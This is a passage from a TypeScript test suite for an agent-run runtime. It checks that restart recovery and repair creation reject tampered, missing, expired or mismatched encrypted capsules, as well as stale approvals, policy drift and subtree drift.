      WHERE id = 'orphan-v22'`).get()).toEqual({ decision: 'approved' });
    inspected.close();
  });
});

/* ============================================================
 * 16. Restart finalization must never treat damaged result
 *     evidence as accepted ingress. These are intentionally
 *     fresh-process tests: no in-memory capsule state may hide
 *     a failed result capsule verification.
 * ============================================================ */
describe('Sequence 1B M1 — restart result capsule integrity', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-result-restart'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  function receivedFixture(masterKey: Buffer) {
    const writer = wireProcess(dir, masterKey);
    const workspaceId = makeWorkspaceId(writer.odb);
    const runId = makeRunId(writer.odb, workspaceId);
    const root = writer.runtime.createRootFrame({ runId });
    const frame = writer.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    const lease = writer.runtime.acquireLease({ runId, holderId: 'writer', ttlMs: 60_000 });
    const prepared = writer.protocol.prepare({
      runId, ownerFrameId: frame.id, effectType: 'test.result',
      adapterKind: 'mock', adapterVersion: 'restart-v1', payload: { stable: true },
      payloadFingerprint: 'egress-result', capsuleFingerprint: 'capsule-result',
      idempotencyKey: 'idem-result', scopeHash: 'scope-result',
      routeDecisionId: '', policyEvaluationId: '', policyVersionHash: 'ph_m1',
    });
    writer.protocol.casToInFlight({
      effectId: prepared.effectId, expectedRevision: 1, expectedAttemptNo: 1,
      leaseHolder: 'writer',
    });
    const receipt = writer.protocol.recordReceipt({
      effectId: prepared.effectId, attemptNo: 1, requestId: 'result-request',
      requestHash: 'result-request-hash', result: { accepted: true },
      applicationStatus: 'applied', providerStatus: 'ok',
    });
    writer.runtime.releaseLease({
      runId, holderId: 'writer', expectedLeaseVersion: lease.leaseVersion,
    });
    return { writer, workspaceId, runId, effectId: prepared.effectId, receiptId: receipt.receiptId };
  }

  async function assertRestartBlocked(input: {
    masterKey: Buffer; runId: string; effectId: string; expectedFailure: string;
  }) {
    const restarted = wireProcess(dir, input.masterKey);
    await expect(restarted.recovery.recover({
      runId: input.runId, holderId: 'restarted',
    })).rejects.toThrow(/CAPSULE/);
    expect(restarted.runtime.readEffect(input.effectId).state).toBe('received');
    expect(restarted.odb.getDB().prepare(`SELECT COUNT(*) AS c FROM ingress_findings
      WHERE effect_id = ? AND finding_kind = 'accepted'`).get(input.effectId))
      .toMatchObject({ c: 0 });
    expect(restarted.capsuleStore.listFailures(input.effectId)
      .some((failure: any) => failure.failureKind === input.expectedFailure)).toBe(true);
  }

  it('blocks restart finalization when the authoritative result capsule is missing', async () => {
    const masterKey = crypto.randomBytes(32);
    const f = receivedFixture(masterKey);
    f.writer.odb.getDB().prepare(`DELETE FROM capsules
      WHERE effect_id = ? AND capsule_kind = 'result'`).run(f.effectId);
    await assertRestartBlocked({ ...f, masterKey, expectedFailure: 'missing' });
  });

  it('blocks restart finalization when result ciphertext is tampered', async () => {
    const masterKey = crypto.randomBytes(32);
    const f = receivedFixture(masterKey);
    const row = f.writer.odb.getDB().prepare(`SELECT blob_payload FROM capsules
      WHERE effect_id = ? AND capsule_kind = 'result'`).get(f.effectId) as { blob_payload: Buffer };
    const tampered = Buffer.from(row.blob_payload);
    tampered[12] ^= 0xff;
    f.writer.odb.getDB().prepare(`UPDATE capsules SET blob_payload = ?
      WHERE effect_id = ? AND capsule_kind = 'result'`).run(tampered, f.effectId);
    await assertRestartBlocked({ ...f, masterKey, expectedFailure: 'decrypt_failed' });
  });

  it('blocks restart finalization when the receipt hash no longer names its result capsule', async () => {
    const masterKey = crypto.randomBytes(32);
    const f = receivedFixture(masterKey);
    f.writer.odb.getDB().prepare(`UPDATE effect_receipts SET result_capsule_hash = ?
      WHERE id = ?`).run('0'.repeat(64), f.receiptId);
    await assertRestartBlocked({ ...f, masterKey, expectedFailure: 'hash_mismatch' });
  });

  it('blocks restart finalization when the result capsule has expired', async () => {
    const masterKey = crypto.randomBytes(32);
    const f = receivedFixture(masterKey);
    f.writer.odb.getDB().prepare(`UPDATE capsules SET expires_at = ?
      WHERE effect_id = ? AND capsule_kind = 'result'`)
      .run(new Date(Date.now() - 60_000).toISOString(), f.effectId);
    await assertRestartBlocked({ ...f, masterKey, expectedFailure: 'expired' });
  });

  it('blocks restart finalization after workspace AAD tag drift', async () => {
    const masterKey = crypto.randomBytes(32);
    const f = receivedFixture(masterKey);
    f.writer.odb.getDB().prepare(`UPDATE workspaces SET workspace_tag = hex(randomblob(16))
      WHERE id = ?`).run(f.workspaceId);
    await assertRestartBlocked({ ...f, masterKey, expectedFailure: 'wrong_workspace' });
  });
});

/* ============================================================
 * 17. Typed repair verification validates the sealed callback,
 *     not just the rows which reference it.
 * ============================================================ */
describe('Sequence 1B M1 — typed repair evidence verifier', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-repair-evidence'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  function preparedRepairable() {
    const process = wireProcess(dir, crypto.randomBytes(32));
    const workspaceId = makeWorkspaceId(process.odb);
    const runId = makeRunId(process.odb, workspaceId);
    const root = process.runtime.createRootFrame({ runId });
    const frame = process.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    const routeDecisionId = `rd-repair-${crypto.randomBytes(6).toString('hex')}`;
    process.odb.getDB().prepare(`INSERT INTO route_decisions
      (id, run_id, route, data_classification, requires_user_approval, created_at)
      VALUES (?, ?, 'local', 'Public', 0, ?)`)
      .run(routeDecisionId, runId, new Date().toISOString());
    const token = crypto.randomBytes(6).toString('hex');
    const prepared = process.protocol.prepare({
      runId, ownerFrameId: frame.id, effectType: 'repairable',
      adapterKind: 'mock', adapterVersion: 'repair-v1', payload: { repair: true },
      payloadFingerprint: `egress-repair-${token}`, capsuleFingerprint: `capsule-repair-${token}`,
      idempotencyKey: `idem-repair-${token}`, scopeHash: 'scope-repair',
      routeDecisionId, policyEvaluationId: '', policyVersionHash: 'ph_m1',
    });
    process.odb.getDB().prepare(`UPDATE run_effects
      SET allowed_repair_actions_json = '["retry"]' WHERE id = ?`).run(prepared.effectId);
    const effect = process.runtime.readEffect(prepared.effectId);
    const request = (overrides: Record<string, unknown> = {}) => ({
      runId, targetFrameId: frame.id,
      expectedSubtreeRevision: process.runtime.readFrame(frame.id).subtreeRevision,
      authorizedEffectRevisions: { [effect.id]: effect.effectRevision },
      proposedPlan: [{ effectId: effect.id, expectedEffectRevision: effect.effectRevision, action: 'retry' as const }],
      ...overrides,
    });
    return { process, runId, root, frame, effect, request };
  }

  it('AEAD-opens a sealed callback and rejects ciphertext or idempotency-reference tampering', () => {
    const f = preparedRepairable();
    // A valid M1 capsule demonstrates that repair is using the real protocol path.
    expect(f.process.runtime.createRepair(f.request()).status).toBe('open');
    const row = f.process.odb.getDB().prepare(`SELECT blob_payload FROM capsules
      WHERE ref = ?`).get(f.effect.callbackCapsuleRef) as { blob_payload: Buffer };
    const tampered = Buffer.from(row.blob_payload);
    tampered[12] ^= 0xff;
    f.process.odb.getDB().prepare('UPDATE capsules SET blob_payload = ? WHERE ref = ?')
      .run(tampered, f.effect.callbackCapsuleRef);
    expect(() => f.process.runtime.createRepair(f.request())).toThrow(/REPAIR_INVALID/);
    expect(f.process.capsuleStore.listFailures(f.effect.id).length).toBeGreaterThan(0);

    const g = preparedRepairable();
    g.process.odb.getDB().prepare('UPDATE run_effects SET idempotency_key_hash = ? WHERE id = ?')
      .run('f'.repeat(64), g.effect.id);
    expect(() => g.process.runtime.createRepair(g.request())).toThrow(/REPAIR_INVALID/);
  });

  it('enforces action/state, explicit cross-frame authority, and the per-effect revision map', () => {
    const f = preparedRepairable();
    expect(() => f.process.runtime.createRepair(f.request({
      proposedPlan: [{ effectId: f.effect.id, expectedEffectRevision: f.effect.effectRevision, action: 'compensate' }],
    }))).toThrow(/REPAIR_INVALID/);
    expect(() => f.process.runtime.createRepair(f.request({
      authorizedEffectRevisions: { [f.effect.id]: f.effect.effectRevision + 1 },
    }))).toThrow(/REPAIR_INVALID/);

    const branch = f.process.runtime.createChildFrame({
      runId: f.runId, parentFrameId: f.root.id, frameKind: 'plan_step',
    });
    expect(() => f.process.runtime.createRepair({
      ...f.request(), targetFrameId: branch.id,
      expectedSubtreeRevision: f.process.runtime.readFrame(branch.id).subtreeRevision,
    })).toThrow(/REPAIR_SIBLING_OVERREACH/);
    // A caller-provided effect-id list is explicitly NOT a repair authority.
    // M1 accepts cross-frame work only with a durable, scope-bound approval.
    expect(() => f.process.runtime.createRepair({
      ...f.request(), targetFrameId: branch.id,
      expectedSubtreeRevision: f.process.runtime.readFrame(branch.id).subtreeRevision,
      authorizedCrossFrameEffectIds: [f.effect.id],
    })).toThrow(/REPAIR_INVALID/);

    const approvalId = `approval-repair-${crypto.randomBytes(4).toString('hex')}`;
    const workspaceId = (f.process.odb.getDB().prepare(
      'SELECT workspace_id FROM agent_runs WHERE id = ?',
    ).get(f.runId) as { workspace_id: string }).workspace_id;
    f.process.odb.getDB().prepare(`
      INSERT INTO approvals (id, run_id, approval_type, requested_scope_json,
        decision, workspace_id, scope_hash, policy_version_hash,
        payload_fingerprint, revision, use_limit, uses_consumed,
        effect_id, effect_revision, created_at)
      VALUES (?, ?, 'repair_cross_frame', ?, 'approved', ?, ?, ?, ?, 1, 1, 0, ?, ?, ?)
    `).run(
      approvalId, f.runId, JSON.stringify({
        runId: f.runId, targetFrameId: branch.id,
        effectId: f.effect.id, effectRevision: f.effect.effectRevision,
      }), workspaceId, f.effect.scopeHash, f.effect.policyVersionHash,
      f.effect.payloadFingerprint, f.effect.id, f.effect.effectRevision,
      new Date().toISOString(),
    );
    expect(f.process.runtime.createRepair({
      ...f.request(), targetFrameId: branch.id,
      expectedSubtreeRevision: f.process.runtime.readFrame(branch.id).subtreeRevision,
      crossFrameApprovalIds: { [f.effect.id]: approvalId },
    }).status).toBe('open');
  });

  it('rejects stale approval, missing route evidence, policy drift, and commit-time subtree drift', () => {
    const approval = preparedRepairable();
    approval.process.odb.getDB().prepare('UPDATE run_effects SET current_approval_id = ? WHERE id = ?')
      .run('missing-approval', approval.effect.id);
    expect(() => approval.process.runtime.createRepair(approval.request())).toThrow(/REPAIR_INVALID/);

    const route = preparedRepairable();
    route.process.odb.getDB().prepare('UPDATE run_effects SET route_decision_id = ? WHERE id = ?')
      .run('missing-route', route.effect.id);
    expect(() => route.process.runtime.createRepair(route.request())).toThrow(/REPAIR_INVALID/);

    const policy = preparedRepairable();
    policy.process.odb.getDB().prepare('UPDATE run_effects SET policy_version_hash = ? WHERE id = ?')
      .run('stale-policy', policy.effect.id);
    expect(() => policy.process.runtime.createRepair(policy.request())).toThrow(/REPAIR_INVALID/);

    const drift = preparedRepairable();
    const repair = drift.process.runtime.createRepair(drift.request());
    drift.process.runtime.createChildFrame({
      runId: drift.runId, parentFrameId: drift.frame.id, frameKind: 'repair',
    });
    expect(() => drift.process.runtime.setRepairStatus(repair.id, 'accepted')).not.toThrow();
    expect(() => drift.process.runtime.setRepairStatus(repair.id, 'committed'))
      .toThrow(/REPAIR_SUBTREE_REVISION_DRIFT/);
  });
});
